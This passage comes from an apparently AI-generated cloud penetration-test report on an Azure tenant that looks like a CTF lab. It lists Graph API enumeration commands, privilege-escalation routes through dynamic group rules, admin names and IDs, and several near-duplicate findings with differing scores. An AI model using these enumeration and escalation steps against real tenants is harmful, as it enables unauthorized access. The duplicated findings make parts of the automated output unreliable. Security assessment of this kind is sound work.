```

#### Evidence / Logs

```
sp-it-resources: passwordCredentials.endDateTime=2124-08-26T14:10:42Z, displayName=rbac, hint=c-F
sp-banking-storage: passwordCredentials.endDateTime=2028-03-03T19:27:06.971Z, displayName=banking-storage-var, hint=rzu
```

#### Remediation

1. Rotate the sp-it-resources credential immediately and set a maximum 1-year expiry. 2. Implement workload identity federation instead of client secrets where possible. 3. Use Azure Key Vault to store and rotate service principal credentials. 4. Enable credential rotation alerts.

---

### 3.10 — 98-Year Application Credential Expiry (sp-it-resources)

| Field | Value |
|-------|-------|
| **ID** | `vuln_d9b7fe` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.4 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N` |
| **Status** | CONFIRMED |
| **Category** | `security_misconfiguration` |
| **MITRE ATT&CK** | `T1098.001` — Account Manipulation: Additional Cloud Credentials |
| **ISO 27001** | `A.5.17 Authentication Information` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/applications` |
| **Discovered by** | `azure` |
| **Discovered at** | 2026-08-02T14:43:35Z |

#### Description

The application 'sp-it-resources' has a client secret credential with a 98-year expiry (effectively never-expiring). Long-lived credentials for service principals increase the window of exploitation if compromised. Microsoft recommends credential lifetimes of 6-12 months maximum for application registrations. This service principal may have access to IT infrastructure resources.

#### Technical Analysis

A 98-year credential effectively means the secret never rotates. If this credential is ever compromised (via code leak, insider threat, or backup exposure), it provides persistent access for nearly a century. Combined with the Application.ReadWrite.All scope marcus has, an attacker could also extract or add credentials to this application.

#### Exploitation Commands

```bash
curl -s "https://graph.microsoft.com/v1.0/applications" -H "Authorization: Bearer {graph_token}"
```

#### Evidence / Logs

```
Application 'sp-it-resources' has passwordCredential with endDateTime approximately 98 years from creation
Multiple other applications found: sp-banking-storage, HrPortal, HybridSp, DEV-Azure-Functions, etc.
```

#### Remediation

1. Rotate the sp-it-resources client secret immediately with a maximum 12-month expiry. 2. Implement an application credential rotation policy across all applications. 3. Use managed identities instead of client secrets where possible. 4. Enable Microsoft Defender for Cloud Apps to detect anomalous application usage. 5. Configure Azure AD App Credential Governance policies.

---

### 3.11 — Multiple Global Administrators Identified - Excessive Admin Surface

| Field | Value |
|-------|-------|
| **ID** | `vuln_f8e94f` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1087.004` — Account Discovery: Cloud Account |
| **ISO 27001** | `A.9.2.3` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/directoryRoles/93d3a9bb-0817-4fd7-968...` |
| **Discovered by** | `azure-resource` |
| **Discovered at** | 2026-08-02T14:38:20Z |

#### Description

6 Global Administrators were identified in the tenant: Ian Austin (Cloud Admin), Felipe Garcia, Bruce, Mike Jones, Filip Jodoin, and Ayush Singh. Having 6 Global Administrators creates an excessive admin attack surface. Ian Austin (id: 18600f1a-3cee-434e-860f-aff4078da055) is both a Global Administrator AND Key Vault Administrator on the ext-contractors vault, combining high-privilege directory access with secret management.

#### Technical Analysis

Six Global Administrator accounts were enumerated via the Graph API directoryRoles endpoint. Microsoft recommends no more than 5 Global Admins, and ideally 2-4 emergency/break-glass accounts. The combination of Ian Austin having both Global Admin and Key Vault Administrator roles on the ext-contractors vault means a compromise of Ian's account would grant both full tenant control and immediate access to all contractor credentials stored in the vault.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" "https://graph.microsoft.com/v1.0/directoryRoles/93d3a9bb-0817-4fd7-9684-5df14805e612/members"
```

#### Evidence / Logs

```
Global Admin Role Members:
1. Ian Austin (18600f1a) - Cloud Admin, also KV Administrator
2. Felipe Garcia (2527f79a)
3. Bruce (a3a1a558)
4. Mike Jones (ef62b4a7)
5. Filip Jodoin (81499b01)
6. Ayush Singh (33745286)
```

#### Remediation

1. Reduce Global Administrator count to 2-4 maximum. 2. Use dedicated Privileged Identity Management (PIM) for just-in-time access. 3. Separate Key Vault administration from Global Admin roles. 4. Implement break-glass accounts with monitoring.

---

### 3.12 — Sensitive Data Exposed in User Profile jobTitle Field (Flag)

| Field | Value |
|-------|-------|
| **ID** | `vuln_6fb910` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1087.004` — Account Discovery: Cloud Account |
| **ISO 27001** | `A.8.2.1` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/me` |
| **Discovered by** | `azure-resource` |
| **Discovered at** | 2026-08-02T14:38:53Z |

#### Description

The user profile for marcus@megabigtech.com contains a flag/sensitive marker in the jobTitle field: 'Flag: 39c6217c4a28ba7f3198e5542f9e50c4'. This indicates either a CTF objective or that the jobTitle field is being misused to store sensitive data that is readable by all authenticated users via the Graph API /me endpoint.

#### Technical Analysis

The marcus user profile jobTitle field contains what appears to be a flag hash (39c6217c4a28ba7f3198e5542f9e50c4) instead of a legitimate job title. This was accessed via the Graph /me endpoint which returns the signed-in user's profile, confirming the data is readable.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" "https://graph.microsoft.com/v1.0/me"
```

#### Evidence / Logs

```
Response: {"displayName":"Marcus Hutch","jobTitle":"Flag: 39c6217c4a28ba7f3198e5542f9e50c4","userPrincipalName":"marcus@megabigtech.com","id":"41c178d3-c246-4c00-98f0-8113bd631676"}
```

#### Remediation

Remove sensitive data from user profile fields. Job title should contain only job-related information.

---

### 3.13 — Excessive Global Administrator Accounts (6 Users)

| Field | Value |
|-------|-------|
| **ID** | `vuln_389b12` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L` |
| **Status** | CONFIRMED |
| **Category** | `broken_access_control` |
| **MITRE ATT&CK** | `T1078.004` — Valid Accounts: Cloud Accounts |
| **ISO 27001** | `A.8.2 Privileged Access Rights` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/directoryRoles` |
| **Discovered by** | `azure` |
| **Discovered at** | 2026-08-02T14:42:40Z |

#### Description

The tenant has 6 users assigned to the Global Administrator directory role: Ian Austin, Felipe Garcia, Bruce, Mike Jones, Filip Jodoin, Ayush Singh. Microsoft best practice recommends a maximum of 2-4 Global Administrators. Excessive Global Admin accounts increase the attack surface for privilege escalation and account compromise. Combined with the lack of MFA enforcement, any one of these accounts being compromised would grant full tenant control.

#### Technical Analysis

Six Global Administrator accounts significantly expand the blast radius of any credential compromise. Each Global Admin has unrestricted access to all Azure and Microsoft 365 services, making them prime targets for attackers.

#### Exploitation Commands

```bash
curl -s "https://graph.microsoft.com/v1.0/directoryRoles" -H "Authorization: Bearer {graph_token}"
curl -s "https://graph.microsoft.com/v1.0/directoryRoles/{global-admin-role-id}/members" -H "Authorization: Bearer {graph_token}"
```

#### Evidence / Logs

```
Global Administrator role members: Ian Austin, Felipe Garcia, Bruce, Mike Jones, Filip Jodoin, Ayush Singh (6 total)
Microsoft recommends maximum 2-4 Global Admins per tenant
```

#### Remediation

1. Reduce Global Administrator count to 2-4 maximum. 2. Use least-privilege roles (e.g., User Administrator, Application Administrator) instead. 3. Implement Privileged Identity Management (PIM) for just-in-time Global Admin access. 4. Enforce phishing-resistant MFA for all admin accounts. 5. Create break-glass emergency access accounts with monitoring.

---

### 3.14 — Sensitive Data (Flag) in User Profile jobTitle Field

| Field | Value |
|-------|-------|
| **ID** | `vuln_3cbbb4` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1530` — Data from Cloud Storage |
| **ISO 27001** | `A.5.33 Protection of Records` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/me` |
| **Discovered by** | `azure` |
| **Discovered at** | 2026-08-02T14:43:07Z |

#### Description

Marcus Hutch's user profile contains a flag/sensitive data hash in the jobTitle field: 'Flag: 39c6217c4a28ba7f3198e5542f9e50c4'. This indicates sensitive information is being stored in publicly readable directory attributes. The jobTitle field is readable by all authenticated users in the tenant, making this data exposed to the entire organization.

#### Technical Analysis

Sensitive data stored in publicly readable directory attributes is exposed to all authenticated users. This could indicate a pattern of misusing directory fields for storing non-directory data.

#### Exploitation Commands

```bash
curl -s "https://graph.microsoft.com/v1.0/me" -H "Authorization: Bearer {graph_token}"
```

#### Evidence / Logs

```
GET /v1.0/me -> 200 OK: {"displayName":"Marcus Hutch","jobTitle":"Flag: 39c6217c4a28ba7f3198e5542f9e50c4","mail":"marcus@megabigtech.com","id":"41c178d3-c246-4c00-98f0-8113bd631676"}
```

#### Remediation

1. Remove sensitive data from publicly readable directory attributes. 2. Audit all user profile fields for inappropriate data. 3. Use Azure AD extension attributes with restricted read permissions for sensitive metadata. 4. Implement data classification policies.

---

### 3.15 — Dynamic Group 'SERVER-BACKUPS' Auto-Adds All Admin Users

| Field | Value |
|-------|-------|
| **ID** | `vuln_e05e8f` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.0 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1098.003` — Account Manipulation: Additional Cloud Roles |
| **ISO 27001** | `A.9.2.2` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/groups/68e11cdb-bdcb-43f0-892e-f164e7...` |
| **Discovered by** | `azure-resource` |
| **Discovered at** | 2026-08-02T14:38:38Z |

#### Description

The dynamic security group 'SERVER-BACKUPS' (id: 68e11cdb) has membership rule: (user.userPrincipalName -contains 'admin'). This automatically adds ALL users with 'admin' in their UPN to the backup group. Combined with its description mentioning 'breakglass.txt' for emergency access, this exposes a privilege escalation vector: creating a user with 'admin' in the UPN would auto-enroll them in the server backup access group. Additionally, the 'ALGO-ACCESS' dynamic group auto-adds users with jobTitle 'Algorithm Administrator', and the 'IT-AUTHENTICATOR-EXCLUDED' group likely excludes members from MFA enforcement.

#### Technical Analysis

Three dynamic/security groups with dangerous membership rules were discovered. SERVER-BACKUPS auto-enrolls any user with 'admin' in their UPN, meaning anyone who can create or rename a user (which marcus has via User.ReadWrite.All permissions) could create a user with 'admin' in the UPN to gain server backup access. The ALGO-ACCESS group's job-title-based rule means changing a user's jobTitle to 'Algorithm Administrator' would grant them access to the secret algorithm. The IT-AUTHENTICATOR-EXCLUDED group likely provides MFA bypass, and marcus is already a member of the 'Yolo-MFA' group which also suggests MFA exclusion.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" "https://graph.microsoft.com/v1.0/groups"
```

#### Evidence / Logs

```
SERVER-BACKUPS group:
- membershipRule: (user.userPrincipalName -contains "admin")
- description: Restricted membership. In an emergency, access using breakglass.txt
- membershipRuleProcessingState: On
- groupTypes: DynamicMembership

ALGO-ACCESS group:
- membershipRule: (user.jobTitle -eq "Algorithm Administrator")
- description: Restricted group. Grants access to the Mega Big Tech secret algorithm

IT-AUTHENTICATOR-EXCLUDED:
- displayName: IT-AUTHENTICATOR-EXCLUDED
- Security group created 2026-07-27
```

#### Remediation

1. Replace dynamic UPN-based membership rules with explicit group assignments. 2. Use attribute-based rules with protected attributes only. 3. Monitor dynamic group membership changes. 4. Remove the MFA exclusion group or restrict its use.

---

### 3.16 — Dynamic Group SERVER-BACKUPS Auto-Adds Admin Users

| Field | Value |
|-------|-------|
| **ID** | `vuln_7fdebf` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.0 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L` |
| **Status** | CONFIRMED |
| **Category** | `broken_access_control` |
| **MITRE ATT&CK** | `T1484.001` — Domain Policy Modification: Group Policy Modification |
| **ISO 27001** | `A.5.15 Access Control` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/groups` |
| **Discovered by** | `azure` |
| **Discovered at** | 2026-08-02T14:42:55Z |

#### Description

The 'SERVER-BACKUPS' group uses a dynamic membership rule: user.userPrincipalName -contains "admin". This means any user whose UPN contains the string 'admin' is automatically added to this group, which likely grants access to server backup resources. An attacker who can rename a user's UPN or create a new user with 'admin' in the name would automatically inherit these permissions. Similarly, the 'ALGO-ACCESS' group auto-assigns based on jobTitle containing 'Algorithm Administrator'.

#### Technical Analysis

Dynamic groups with overly broad membership rules can be abused for privilege escalation. If an attacker can modify user attributes (UPN or jobTitle), they can automatically gain membership in these groups and inherit any permissions or access associated with them.

#### Exploitation Commands

```bash
curl -s "https://graph.microsoft.com/v1.0/groups" -H "Authorization: Bearer {graph_token}"
```

#### Evidence / Logs

```
SERVER-BACKUPS group: membershipRule = (user.userPrincipalName -contains "admin"), membershipRuleProcessingState = On, groupTypes = ["DynamicMembership"]
ALGO-ACCESS group: membershipRule = (user.jobTitle -eq "Algorithm Administrator"), membershipRuleProcessingState = On, groupTypes = ["DynamicMembership"]
```

#### Remediation

1. Review and tighten dynamic group membership rules. 2. Use specific attribute values rather than -contains patterns. 3. Restrict who can modify user attributes (UPN, jobTitle) via RBAC. 4. Audit dynamic group memberships regularly. 5. Consider replacing dynamic groups with manually managed security groups for sensitive access.

---

## 4. REMEDIATION ROADMAP

### P0 — Immediate (< 24h)

| Finding | Effort |
|---------|--------|
| Key Vault Secret Extraction - Contractor Plaintext Passwords | High |
| Key Vault Secret Extraction - 3 Contractor Plaintext Passwor... | High |

### P1 — Short term (< 1 week)

| Finding | Effort |
|---------|--------|
| Dangerous Custom Roles - VM RunCommand RCE, Container Secret... | High |
| Dangerous Custom RBAC Roles - VM RunCommand RCE and Containe... | High |
| ROPC Password Grant Authentication Succeeds Without MFA | High |
| ROPC Password Grant Without MFA Enforcement | High |
| Excessive Graph API Permissions via ROPC - Full Directory En... | High |
| Excessive Graph API Permissions - Full Directory Enumeration | High |

### P2 — Medium term (< 2 weeks)

| Finding | Effort |
|---------|--------|
| Application Credential with 98-Year Expiry - sp-it-resources | High |
| 98-Year Application Credential Expiry (sp-it-resources) | High |
| Multiple Global Administrators Identified - Excessive Admin ... | High |
| Sensitive Data Exposed in User Profile jobTitle Field (Flag) | High |
| Excessive Global Administrator Accounts (6 Users) | High |

---

*Report auto-generated by Darkmoon AI Security Platform*  
*Classification: CONFIDENTIAL — Restricted to authorized personnel*  
*Generated: 2026-08-02T14:43:50Z*  
*Campaign: camp_20260802_38118fb8 | Target: megabigtech.com*
